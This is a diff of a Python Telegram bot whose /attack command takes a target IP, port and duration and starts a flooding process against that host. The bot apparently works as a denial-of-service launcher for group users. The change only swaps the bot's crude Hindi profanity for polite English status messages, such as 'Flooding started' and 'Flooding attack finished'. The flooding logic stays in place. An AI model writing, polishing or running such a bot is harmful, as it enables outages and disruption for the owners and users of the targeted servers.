@@ -39,7 +39,7 @@ def is_group_chat(update: Update) -> bool:
 
 async def handle_private_chat(update: Update) -> None:
     """Send a message when the bot is used in a private chat."""
-    await update.message.reply_text("🤬BSDK GROUP ME JAKE USE KARR BOT LVDE. YAHA GAND NA MARAO🤬.")
+    await update.message.reply_text("This bot is not designed to be used in private chats. Please use it in a group.")
 
 # Command: /attack
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -52,7 +52,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     track_user(user_id, username)
 
     if len(context.args) != 4:
-        await update.message.reply_text("CHODNE KA TARIKA 🐈: /attack <target_ip> <port> <duration> <sid>")
+        await update.message.reply_text("Usage: /attack <target_ip> <port> <duration> <sid>")
         return
 
     target_ip = context.args[0]
@@ -64,13 +64,13 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     process = subprocess.Popen(flooding_command)
 
     await update.message.reply_text(
-        f"CHUDAI CHALU 👌: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads."
+        f"Flooding started: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads."
     )
 
     await asyncio.sleep(duration)
     process.terminate()
 
-    await update.message.reply_text(f"CHUDALI BAND 👌: {target_ip}:{port}.")
+    await update.message.reply_text(f"Flooding attack finished: {target_ip}:{port}.")
 
 # Command: /stats
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
